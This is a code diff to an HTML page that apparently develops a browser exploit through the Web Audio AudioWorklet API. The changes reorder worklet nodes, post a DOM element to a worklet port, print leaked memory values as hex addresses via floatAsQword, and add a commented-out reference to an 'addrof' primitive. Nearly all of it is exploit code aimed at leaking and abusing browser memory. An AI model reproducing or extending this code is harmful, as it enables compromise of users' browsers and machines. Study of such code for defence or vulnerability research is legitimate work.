@@ -1,5 +1,6 @@
 <body></body>
 <pre id='log' style="font-size : 40px;"></pre>
+<a id="a"></a>
 
 </script>
 <script>
@@ -53,14 +54,17 @@
             await audioCtx.audioWorklet.addModule("fuck.js");
             //alert();
             //await sleep(1000);
-            let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
+            //let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
             let originNode2 = new AudioWorkletNode(audioCtx, 'OrigineWorklet2',{numberOfInputs:0, numberOfOutputs:1});
+            let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
             //return 0;
             let source = new AudioBufferSourceNode(audioCtx);
             let myArrayBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
             await sleep(500);
             //alert();
             let is_leak = true;
+            var d = document.getElementById(a)//document.createElement('div')
+            originNode.port.postMessage(d)
             originNode2.port.onmessage = async (e)=>{
                 if(e.data == "retry"){
                     //print(e.data);
@@ -68,6 +72,13 @@
                     location.reload();
                     return;
                 }
+                /*if(e.data == typeof ArrayBuffer)
+                {
+                    print("attempting export");
+                    //var rw = e.data;
+                    
+                    //alert(rw.addrof({}))
+                }*/
                 if(!is_leak){
                     //console.log(e.data.toString(16));
                     print(e.data);
@@ -78,7 +89,7 @@
                 
                 for(var i = 0; i < leak.length; i ++){
                     if(leak[i] != 0)
-                        (`[${i}] : ` + floatAsQword(leak[i]).toString(16));
+                        print(`[${i}] : ` + floatAsQword(leak[i]).toString(16));
                 }
                 is_leak = false;
                 //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
